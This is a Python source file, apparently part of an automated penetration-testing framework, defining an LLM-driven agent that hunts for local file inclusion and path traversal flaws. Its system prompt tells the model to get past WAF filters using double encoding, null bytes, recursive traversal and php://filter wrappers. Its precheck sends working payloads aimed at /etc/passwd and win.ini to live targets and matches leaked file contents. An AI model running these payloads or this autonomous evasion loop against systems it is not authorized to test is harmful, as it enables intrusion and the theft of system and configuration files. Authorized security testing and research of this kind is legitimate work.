#!/usr/bin/env python3
"""
Smart LFI Hunter - ThoughtLoop based LFI/Path Traversal specialist
"""
import logging
import re
from typing import Dict, Any, Tuple, Optional, List

from src.core.agents.swarm.thought_loop import ThoughtLoop
from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence
from src.core.models.llm import LLMClient
from src.core.infra.network_client import AsyncNetworkClient
from src.core.infra.smart_request import SmartRequest

logger = logging.getLogger(__name__)

class SmartLFIHunter(Specialist, ThoughtLoop):
    """
    思考ループ（ThoughtLoop）を持つ LFI スペシャリスト。
    WAF やフィルタを回避するためのバイパス戦略を LLM を用いて自律的に考案します。
    """

    name = "SmartLFIHunter"
    description = "LFI/Path Traversal Specialist with AI reasoning"

    SYSTEM_PROMPT = """You are an expert LFI/Path Traversal Penetration Tester.
You must work in a thought loop to detect and bypass filters for LFI vulnerabilities.

Commands:
- ACTION: request
  INPUT: [The payload to test]

- ACTION: finish
  INPUT: [vulnerable|safe|unknown]

CRITICAL FORMAT RULES (VIOLATION = IMMEDIATE RETRY):
1. You MUST use EXACTLY this format for EVERY turn:
   THOUGHT: [Your reasoning]
   ACTION: [request|finish]
   INPUT: [payload or vulnerable/safe/unknown]

2. NEVER write "Observation:" or "observation" - this is PROVIDED BY THE TOOL after your Action.
3. NEVER write "Final Answer:" or "Conclusion:" - use "ACTION: finish" instead.
4. NEVER fabricate tool outputs or observations.
5. If you write invalid format, the system will FORCE RETRY.

Guidelines:
1. Target identifiers: /etc/passwd (Linux), C:\\windows\\win.ini (Windows), index.php (PHP wrappers).
2. If standard traversal (../../) is blocked, try:
   - Double encoding: ..%252f
   - Null byte: /etc/passwd%00 (for older PHP)
   - Recursive filters: ....//....//
   - PHP wrappers: php://filter/convert.base64-encode/resource=index
   - Various slash types: ..\\..\\, ..//..//
3. Analyze the observation (status, body, diff) to adapt your next payload.

Format:
THOUGHT: [Reasoning about the next payload strategy based on previous observations]
ACTION: [Command]
INPUT: [Input]
"""

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        Specialist.__init__(self, config)
        ThoughtLoop.__init__(self, max_turns=8)

        mode = "ctf"  # CTF モードで POST リクエストを許可
        if config and isinstance(config, dict):
             mode = config.get("mode", mode)

        self.llm = LLMClient(role="lfi_specialist")
        # SmartRequest requires an AsyncNetworkClient instance
        self.network_client = AsyncNetworkClient()
        self.smart_client = SmartRequest(network_client=self.network_client)
        self.vulnerable = False
        self.evidence = ""

    async def close(self):
        if self.network_client:
            await self.network_client.close()

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        """
        Specialist としてのエントリーポイント
        
        Args:
            task: タスク情報
            quick_mode: True の場合、軽量モードで実行（ターン数制限あり）
        """
        logger.info(f"[{self.name}] Starting ThoughtLoop for {task.target} (quick_mode={quick_mode})")

        # quick_mode の場合、ターン数を制限（デフォルト 8→8、変更なし）
        original_max_turns = self.max_turns
        if quick_mode:
            self.max_turns = 8  # 3 ターンでは不十分なため 8 ターンに

        # タイムアウト制御付きで実行（Layer 2 リトライを考慮して延長）
        # quick_mode: 300 秒、通常：600 秒
        timeout = 300 if quick_mode else 600
        import asyncio
        try:
            result = await asyncio.wait_for(
                self.run_as_tool(task.target, task.params),
                timeout=timeout
            )
        except asyncio.TimeoutError:
            logger.warning(f"[{self.name}] Timeout after {timeout}s for {task.target}")
            return []
        finally:
            # max_turns を元に戻す
            self.max_turns = original_max_turns

        findings = []
        if result.get("vulnerable"):
            tested_param = result.get("param")
            finding = Finding(
                vuln_type=VulnType.LFI,
                severity=Severity.HIGH,
                title=f"LFI/Path Traversal in parameter '{result.get('param', 'unknown')}'",
                description=result.get("description", "Detected by SmartLFIHunter."),
                target_url=task.target,
                evidence=Evidence(
                    request_url=task.target,
                    response_body=str(result.get("evidence", ""))
                ),
                source_agent=self.name,
                confidence=0.9,
                tags=["lfi", "smart_agent"],
                additional_info={
                    "parameter": tested_param,
                    "tested_params": [tested_param] if tested_param else [],
                    "payload": result.get("payloads_used", [""])[-1] if result.get("payloads_used") else "",
                }
            )
            findings.append(finding)

        return findings

    async def run_as_tool(self, url: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
        """Manager から呼び出し可能な Tool メソッド。"""
        params = params or {}
        _auth = params.get("_auth", {})
        auth_headers = _auth.get("auth_headers", {})
        cookies_str = _auth.get("cookies", "")

        method = params.get("method", "GET").upper()
        target = url

        META_KEYS = {
            "_auth", "method", "content_type", "task_id",
            "targets", "targets_file", "source_file", "cookies",
            "tags", "category", "_context", "extra_targets",
            "auth_headers", "headers", "count",
            # manager metadata (not injectable params)
            "forms", "url_evidence", "scan_profile", "profile",
            "detection_mode", "phase", "phase_hint",
            "phase2_on_empty_phase1", "phase2_max_seconds",
            "phase2_max_seconds_risk_forced", "phase2_risk_force_vuln_types",
            "phase1_force_full_coverage", "phase1_stop_on_first_hit",
            "phase1_early_return_on_findings", "per_url_timeout_seconds",
            "per_url_timeout_by_type",
        }

        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(target)
        url_params = parse_qs(parsed.query)
        url_params_flat = {k: v[0] if v else "" for k, v in url_params.items()}

        payload_params: Dict[str, Any] = {}
        for key, value in params.items():
            if not key or key in META_KEYS or str(key).startswith("_"):
                continue
            # nested structures are manager context metadata, not injectable values
            if isinstance(value, (dict, list, tuple, set)):
                continue
            payload_params[str(key)] = value

        # GET の場合は URL クエリを優先して注入対象を決める
        if method == "GET" and url_params_flat:
            merged_params = dict(url_params_flat)
            merged_params.update(payload_params)
            payload_params = merged_params
        elif not payload_params:
            payload_params = url_params_flat

        tested_param_names = [k for k in payload_params.keys() if k]

        if cookies_str and "Cookie" not in auth_headers:
            auth_headers["Cookie"] = cookies_str

        # ThoughtLoop コンテキスト設定
        self.context = {
            "target": target,
            "param": list(payload_params.keys())[0] if payload_params else None,
            "method": method,
            "params": payload_params,
            "auth_headers": auth_headers,
            "cookies": cookies_str,
        }

        # State 初期化
        self.vulnerable = False
        self.evidence = ""
        self.used_payloads = []
        loop_result: Dict[str, Any] = {"status": "not_run"}
        deterministic = await self._run_lfi_deterministic_precheck(tested_param_names)
        if deterministic.get("confirmed"):
            self.vulnerable = True
            self.context["param"] = deterministic.get("param", self.context.get("param"))
            self.evidence = str(deterministic.get("evidence", "LFI signal confirmed"))
            payload = str(deterministic.get("payload", "") or "")
            if payload and payload not in self.used_payloads:
                self.used_payloads.append(payload)
            loop_result = {"status": "deterministic_precheck_confirmed", **deterministic}
        else:
            self.history_messages = []
            self.history_messages.append({"role": "system", "content": self.SYSTEM_PROMPT})

            initial_prompt = f"""Target URL: {target}
Method: {method}
Parameter: {self.context['param']}
Original Value: {payload_params.get(self.context['param'], '') if payload_params else ''}

Start your LFI/Path Traversal testing.
"""
            self.history_messages.append({"role": "user", "content": initial_prompt})

            # ThoughtLoop を実行（親クラスの run_loop を使用）
            try:
                loop_result = await self.run_loop(self.context)
            except Exception as e:
                logger.error(f"[{self.name}] ThoughtLoop failed: {e}")
                loop_result = {"status": "failed", "error": str(e)}

        return {
            "vulnerable": self.vulnerable,
            "evidence": self.evidence,
            "param": self.context.get("param"),
            "tested_params": tested_param_names,
            "payloads_used": self.used_payloads,
            "description": f"LFI detected." if self.vulnerable else "No LFI detected.",
            "loop_result": loop_result
        }

    async def _run_lfi_deterministic_precheck(self, tested_params: List[str]) -> Dict[str, Any]:
        """
        LLM 前段で汎用 LFI/Traversal payload を軽量検証する。
        """
        if not tested_params:
            return {"confirmed": False}

        from urllib.parse import urlparse
        path = urlparse(str(self.context.get("target", ""))).path.strip("/")
        depth_hint = max(4, path.count("/") + 2)

        probe_payloads = [
            "../" * (depth_hint + 2) + "etc/passwd",
            "../" * depth_hint + "etc/passwd",
            "/etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "../../../../windows/win.ini",
            "php://filter/convert.base64-encode/resource=index.php",
        ]

        for param_name in tested_params:
            self.context["param"] = param_name
            for payload in probe_payloads:
                obs = await self._send_request(payload)
                if obs.get("diff") == "lfi_found":
                    return {
                        "confirmed": True,
                        "param": param_name,
                        "payload": payload,
                        "evidence": (
                            f"Deterministic LFI signal on '{param_name}'"
                            + (f" (matched: {obs.get('match')})" if obs.get("match") else "")
                        ),
                    }

        return {"confirmed": False}

    async def decide(self, turn: int) -> Tuple[str, str, Any]:
        """
        LLM decides the next move.
        
        LLM の出力を検証し、不正な形式（Observation の自己生成など）を検出したらリトライ。
        """
        history_text = "\n".join([
            f"Turn {s.turn}: Act={s.action}({s.action_input}) -> {s.observation}"
            for s in self.history
        ])

        prompt = f"""Target: {self.context['target']}
Testing Parameter: {self.context['param']}
Method: {self.context['method']}
Current Turn: {turn}

History:
{history_text if history_text else 'No previous actions'}

Decide next step for LFI testing.
"""
        response = await self.llm.agenerate([
            {"role": "system", "content": self.SYSTEM_PROMPT},
            {"role": "user", "content": prompt}
        ])

        content = response.choices[0].message.content if response and response.choices else ""

        # フォールバック
        if not content:
            logger.warning(f"Turn {turn}: LLM returned empty content. Forcing finish.")
            return "Analysis complete (LLM empty)", "finish", "safe"

        # Layer 2: LLM 出力の厳密な検証
        if "Observation:" in content or "observation" in content.lower():
            logger.warning(f"Turn {turn}: LLM wrote 'Observation:'! Forcing retry...")
            self.history.append({
                "role": "user",
                "content": "ERROR: Do NOT write 'Observation:'. Observation is PROVIDED BY THE TOOL. Only output THOUGHT, ACTION, and INPUT."
            })
            if turn < self.max_turns:
                return await self.decide(turn)
            else:
                return "Analysis complete (invalid format)", "finish", "safe"

        if "Final Answer:" in content or "final answer" in content.lower():
            logger.warning(f"Turn {turn}: LLM wrote 'Final Answer:'! Forcing retry...")
            self.history.append({
                "role": "user",
                "content": "ERROR: Use 'ACTION: finish' instead of 'Final Answer:'. Please retry."
            })
            if turn < self.max_turns:
                return await self.decide(turn)
            else:
                return "Analysis complete (invalid format)", "finish", "safe"

        # Parse
        thought = "Analyzing..."
        action = "finish"
        action_input = "safe"

        thought_match = re.search(r'THOUGHT:\s*(.+?)(?=\nACTION:|$)', content, re.DOTALL | re.IGNORECASE)
        action_match = re.search(r'ACTION:\s*([a-zA-Z_]+)', content, re.IGNORECASE)
        input_match = re.search(r'INPUT:\s*(.+)', content, re.IGNORECASE)

        if thought_match:
            thought = thought_match.group(1).strip()
        if action_match:
            action = action_match.group(1).strip().lower()
        if input_match:
            action_input = input_match.group(1).strip()

        return thought, action, action_input

    async def act(self, action: str, action_input: Any) -> str:
        """Execute action (ThoughtLoop abstract method)."""
        if action == "finish":
            if "vulnerable" in str(action_input).lower():
                self.vulnerable = True
                self.evidence = str(action_input)
            return f"Finished: {action_input}"

        if action == "request":
            payload = str(action_input)
            self.used_payloads.append(payload)

            # リクエスト送信
            obs = await self._send_request(payload)
            return f"Observation: Status={obs['status']}, Diff={obs['diff']}, Body={obs['body_snippet']}"

        return f"Unknown action: {action}"

    async def should_stop(self, step) -> bool:
        """Check if we should stop."""
        if step.action == "finish":
            return True
        return False

    def get_result(self) -> Dict[str, Any]:
        """Override to return LFI-specific result."""
        return {
            "status": self.status.value,
            "turns": len(self.history),
            "vulnerable": self.vulnerable,
            "evidence": self.evidence,
            "payloads_used": self.used_payloads
        }

    async def _send_request(self, payload: str) -> Dict[str, Any]:
        """実際のリクエストを送信し、結果を返す"""
        param = self.context.get("param")
        target = self.context.get("target")
        method = self.context.get("method", "GET")
        auth_headers = self.context.get("auth_headers", {})
        params = self.context.get("params", {}).copy()

        if param and param in params:
            params[param] = payload

        try:
            if method == "POST":
                resp = await self.smart_client.request(
                    "POST",
                    target,
                    data=params,
                    headers=auth_headers,
                    timeout=60
                )
            else:
                from urllib.parse import urlparse, urlencode, urlunparse
                parsed = urlparse(target)
                new_query = urlencode(params)
                new_url = urlunparse(parsed._replace(query=new_query))

                resp = await self.smart_client.request(
                    "GET",
                    new_url,
                    headers=auth_headers,
                    timeout=60
                )

            # SmartRequest のレスポンスは辞書オブジェクト
            raw_body = str(resp.get("body", "") or "")
            body_snippet = raw_body[:500]
            status = resp.get("status", 0)
            error = resp.get("error")

            # RequestGuard などでブロックされた場合
            if error or status == 0:
                logger.warning(f"[{self.name}] Request blocked or failed: {error}")
                return {"status": status, "diff": "blocked", "body_snippet": f"Blocked: {error}"}

            lfi_patterns = [
                r"root:[^\n]*:0:0:",
                r"daemon:[^\n]*:[0-9]+:[0-9]+:",
                r"bin:[^\n]*:1:1:",
                r"www-data:[^\n]*:[0-9]+:[0-9]+:",
                r"\[extensions\]",
                r"\[fonts\]",
                r"\[boot loader\]",
                r"\[mci extensions\]",
                r"PD9waH[A-Za-z0-9+/=]{8,}",
            ]
            matched_pattern = next(
                (pattern for pattern in lfi_patterns if re.search(pattern, raw_body, re.IGNORECASE | re.MULTILINE)),
                None,
            )
            diff = "lfi_found" if matched_pattern else "normal"

            return {
                "status": status,
                "diff": diff,
                "body_snippet": body_snippet[:200],
                "match": matched_pattern or "",
            }

        except Exception as e:
            logger.error(f"[{self.name}] Request failed: {e}")
            return {"status": 0, "diff": "error", "body_snippet": str(e)}
